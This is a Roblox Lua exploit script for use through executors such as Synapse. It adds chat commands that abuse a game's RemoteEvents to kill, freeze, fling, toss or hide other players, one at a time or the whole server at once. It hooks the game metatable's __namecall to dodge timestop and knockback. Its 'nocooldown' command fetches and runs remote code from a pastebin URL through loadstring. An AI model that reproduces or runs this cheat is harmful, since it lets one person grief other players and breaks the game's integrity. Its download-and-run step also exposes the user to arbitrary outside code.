Commands = {
    '<prefix>freeze <plr>/<all> \n';
    '<prefix>unfreeze <plr>/<all> \n';
	'<prefix>inv <plr> --Invisible \n';
	'<prefix>uninv <plr> --Disable inv effect \n';
	'<prefix>ungod \n';
    '<prefix>kill <plr>/<all> \n';
    '<prefix>god <plr>/<all> \n';
    '<prefix>fling <plr>/<all> \n';
    '<prefix>toss <plr>/<all> \n';
    '<prefix>recolor <plr>/<all> --Recolors the vision \n';
    '<prefix>circular <plr>/<all> \n';
    '<prefix>push <plr>/<all> \n';
    '<prefix>ts --Timestop \n';
    '<prefix>antiknock --You dont fall when got damage \n';
    '<prefix>unts --Disable Timestop \n';
    '<prefix>antiTS --Move in Timestop \n';
    '<prefix>items --Teleport all items \n';
    '<prefix>deflect \n';
    '<prefix>undeflect \n';
	'<prefix>guispam --Spams the gui see all players \n';
	'<prefix>nocooldown --Disable Cooldown creds to CreativeHell \n';
	'<prefix>ungod --Disable god effect \n';
	'<prefix>help --Prints Commands in the console \n';
}

function chatmessage(text)
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = text;
	Color = Color3.new(248, 248, 248);
	Font = Enum.Font.SourceSans;
	FontSize = Enum.FontSize.Size48;
})
end

function sendmessage(string)
game.StarterGui:SetCore("SendNotification", {
	Title = "Notify!";
	Text = string;
	Icon = "rbxassetid://5117692796";
	Duration = 3;
})
end


local exploit = (pebc_execute and 'ProtoSmasher') or (secure_load and 'Sentinel') or (syn and 'Synapse') or (sirhurt_setup_secure_run and 'SirHurt')
if not exploit then
	chatmessage('Cant detect exploit,some commands maybe dont work')
else
	chatmessage('Exploit Detected:'..exploit)
end
chatmessage('Script Created by string.split#8169/full')
chatmessage('If you want to support me, simply like my thread...')

wait(5)
chatmessage('Type <prefix>help to get all commands in the console!')
chatmessage('Ready!')

local ReplicatedStorage = game:GetService('ReplicatedStorage')
pref = prefix

local function FindPlayers(player)
for i,v in pairs(game.Players:GetPlayers()) do
	if v.Name:lower() == player:lower() or v.Name:lower():find(player:lower()) and v.Name:upper() == player:upper() or v.Name:upper():find(player:upper()) then
		return v
		end
	end
end

local iplr = game.Players.LocalPlayer
iplr.Chatted:connect(function(msg)
	if msg:sub(1,7) == pref..'freeze' then
		local p = FindPlayers(msg:lower():sub(9)) or FindPlayers(msg:upper():sub(9))
			if p and p.Character then
			ReplicatedStorage.Anchor:FireServer(game.Players:WaitForChild(p.Name).Character.HumanoidRootPart,true)
		end
	end
	if msg:sub(1,3) == pref..'ts' then
	ReplicatedStorage.Timestop:FireServer(math.pow(math.huge,math.huge)*math.huge,nil)
end
	if msg:sub(1,5) == pref..'unts' then
	ReplicatedStorage.Untimestop:FireServer()
	end
	if msg:sub(1,9) == pref..'unfreeze' then
		local p = FindPlayers(msg:lower():sub(11)) or FindPlayers(msg:upper():sub(11))
			if p and p.Character then
			ReplicatedStorage.Anchor:FireServer(game.Players:WaitForChild(p.Name).Character.HumanoidRootPart,false)
		end
	end
	if msg:sub(1,7) == pref..'antiTS' then
		local mt = getrawmetatable(game)
		local namecall = mt.__namecall
		setreadonly(mt,false)
		mt.__namecall=newcclosure(function(self,...)
		local arg = {...}
		if tostring(self) == "Anchor" then
		arg[2] = false
	return namecall(self,unpack(arg))
		end
	return namecall(self,...)
	end)
end
	if msg:sub(1,6) == pref..'items' then
	for _,k in pairs(game.Workspace:GetDescendants()) do
		if k:IsA('Tool') then
			k.Handle.CFrame = iplr.Character.HumanoidRootPart.CFrame
		end
	end
end
	if msg:sub(1,8) == pref..'deflect' then
	ReplicatedStorage.Deflect:FireServer(true)
end
	if msg:sub(1,10) == pref..'undeflect' then
	ReplicatedStorage.Deflect:FireServer(false)
end
	if msg:sub(1,4) == pref..'god' then
	local p = FindPlayers(msg:lower():sub(6)) or FindPlayers(msg:upper():sub(6))
		if p and p.Character then
		ReplicatedStorage.BerserkFX:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid,CFrame.new(0,0,0),1,0,Vector3.new(0,0,0),"rbxassetid://241837157",0,Color3.new(255,255,255),"rbxassetid://4796047595",0,0)
	end
end
	if msg:sub(1,4) == pref..'inv' then
		local p = FindPlayers(msg:lower():sub(7)) or FindPlayers(msg:upper():sub(7))
		if p and p.Character then
		for indexx,inviss in pairs(game:GetService('Workspace')[p.Name]:GetDescendants()) do
			ReplicatedStorage.Pillarman:FireServer(inviss,1)
		end
	end
end
	if msg:sub(1,5) == pref..'kill' then
		local p = FindPlayers(msg:lower():sub(7)) or FindPlayers(msg:upper():sub(7))
		if p and p.Character then
			for i=0,4 do
			ReplicatedStorage.Damage:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid,CFrame.new(0,0,0),100,0.25,Vector3.new(0,0,0),"rbxassetid://241837157",0.075,Color3.new(255, 255, 255),"rbxassetid://260430079",1,0.4)
		end
	end
end
	if msg:sub(1,6) == pref..'fling' then
		local p = FindPlayers(msg:lower():sub(8)) or FindPlayers(msg:upper():sub(8))
		if p and p.Character then
		ReplicatedStorage.SunlightYellow:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid,CFrame.new(0,0,0),0,0.25,Vector3.new(0,10000000,0),'rbxassetid://241837157',0.075,Color3.new(1,1,1),'rbxassetid://260430079',1.1,0.2)
	end
end
	if msg:sub(1,11) == pref..'nocooldown' then
		loadstring(game:HttpGetAsync('https://pastebin.com/raw/frJkW35h'))()
end
	if msg:sub(1,11) == pref..'freeze all' then
		for jk,z in pairs(game:GetService('Players'):GetChildren()) do
			if z ~= iplr then
			ReplicatedStorage.Anchor:FireServer(z.Character.HumanoidRootPart,true)
		end
	end
end
	if msg:sub(1,13) == pref..'unfreeze all' then
		for hja,horny in pairs(game:GetService('Players'):GetChildren()) do
			if horny ~= iplr then
			ReplicatedStorage.Anchor:FireServer(horny.Character.HumanoidRootPart,false)
		end
	end
end
	if msg:sub(1,10) == pref..'fling all' then
		for xxx,asf in pairs(game:GetService('Players'):GetChildren()) do
			if asf ~= iplr then
			ReplicatedStorage.SunlightYellow:FireServer(asf.Character.Humanoid,CFrame.new(0,0,0),0,0.25,Vector3.new(0,10000000,0),'rbxassetid://241837157',0.075,Color3.new(1,1,1),'rbxassetid://260430079',1.1,0.2)
		end
	end
end
	if msg:sub(1,9) == pref..'kill all' then
		for zzz,nmap in pairs(game:GetService('Players'):GetChildren()) do
			if nmap ~= iplr then
			for i=0,4 do
				ReplicatedStorage.Damage:FireServer(nmap.Character.Humanoid,CFrame.new(0,0,0),100,0.25,Vector3.new(0,0,0),"rbxassetid://241837157",0.075,Color3.new(255, 255, 255),"rbxassetid://260430079",1,0.4)
			end
		end
	end
end
	if msg:sub(1,8) == pref..'god all' then
		for xzx,sit in pairs(game:GetService('Players'):GetChildren()) do
			if sit ~= iplr then
			ReplicatedStorage.BerserkFX:FireServer(sit.Character.Humanoid,CFrame.new(0,0,0),1,0,Vector3.new(0,0,0),"rbxassetid://241837157",0,Color3.new(255,255,255),"rbxassetid://4796047595",0,0)
		end
	end
end
	if msg:sub(1,5) == pref..'toss' then
	local p = FindPlayers(msg:lower():sub(7)) or FindPlayers(msg:upper():sub(7))
			if p and p.Character then
			ReplicatedStorage.SunlightYellow:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid,CFrame.new(0,0,0),0,0.25,iplr.Character.HumanoidRootPart.Position,'rbxassetid://241837157',0.075,Color3.new(1,1,1),'rbxassetid://260430079',1.1,0.2)
		end
	end
	if msg:sub(1,10) == pref..'antiknock' then
	local mt = getrawmetatable(game)
	setreadonly(mt, false)
	local old = mt.__namecall
mt.__namecall = newcclosure(loadstring([[
    local old = ...
    return function(self, ...)
        local len = select("#", ...)
        local pack = {...}
        local args = {}
        for i=1,len do
            args[i] = pack[i]
        end
        local method = getnamecallmethod()
        if method == "FireServer" and tostring(self) == "Knocked" and tostring(self) == 'GetUp' then
                        return "easy"
                end
        return old(self, ...)
    end
]])(old))
end
	if msg:sub(1,8) == pref..'recolor' then
		local p = FindPlayers(msg:lower():sub(10)) or FindPlayers(msg:upper():sub(10))
			if p and p.Character then
			while wait() do
			game.ReplicatedStorage.BerserkRequiem:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid)
		end
	end
end
	if msg:sub(1,12) == pref..'recolor all' then
		for qeqe,shi in pairs(game:GetService('Players'):GetChildren()) do
		if shi ~= iplr then
		while wait() do
			game.ReplicatedStorage.BerserkRequiem:FireServer(shi.Character.Humanoid)
			end
		end
	end
end
	if msg:sub(1,9) == pref..'toss all' then
		for kjia,cbt in pairs(game:GetService('Players'):GetChildren()) do
			if cbt ~= iplr then
				ReplicatedStorage.SunlightYellow:FireServer(cbt.Character.Humanoid,CFrame.new(0,0,0),0,0.25,iplr.Character.HumanoidRootPart.Position,'rbxassetid://241837157',0.075,Color3.new(1,1,1),'rbxassetid://260430079',1.1,0.2)
			end
		end
	end
	if msg:sub(1,8) == pref..'guispam' then
		for ssa,spam in pairs(game:GetService("StarterGui"):GetChildren()) do
		ReplicatedStorage.Trail:FireServer(spam,true)
	end
end
	if msg:sub(1,9) == pref..'circular' then
		local p = FindPlayers(msg:lower():sub(11)) or FindPlayers(msg:upper():sub(11))
		if p and p.Character then
			ReplicatedStorage.AnubisDamage2:FireServer(game.Players:WaitForChild(p.Name).Character.Humanoid,0,39.9,Vector3.new(100,0,0))
		end
	end
	if msg:sub(1,13) == pref..'circular all' then
		for zxcvbb,circular in pairs(game:GetService('Players'):GetChildren()) do
			if circular ~= iplr then
				ReplicatedStorage.AnubisDamage2:FireServer(circular.Character.Humanoid,0,39.9,Vector3.new(100,0,0))
			end
		end
	end
	if msg:sub(1,9) == pref..'push all' then
		for asert,push in pairs(game:GetService('Players'):GetChildren()) do
			if push ~= iplr then
			ReplicatedStorage.Donut:FireServer(push.Character,0)
		end
	end
end
	if msg:sub(1,5) == pref..'push' then
	local p = FindPlayers(msg:lower():sub(7)) or FindPlayers(msg:upper():sub(7))
	if p and p.Character then
		ReplicatedStorage.Donut:FireServer(game.Players:WaitForChild(p.Name).Character,0)
	end
end
	if msg:sub(1,5) == pref..'help' then
		print(unpack(Commands))
	end
	if msg:sub(1,6) == pref..'ungod' then
		iplr.Character:BreakJoints()
	end
	if msg:sub(1,6) == pref..'uninv' then
		local p = FindPlayers(msg:lower():sub(8)) or FindPlayers(msg:upper():sub(8))
		if p and p.Character then
		for indexx,inviss in pairs(game:GetService('Workspace')[p.Name]:GetDescendants()) do
				ReplicatedStorage.Pillarman:FireServer(inviss,0)
			end
		end
	end
end)
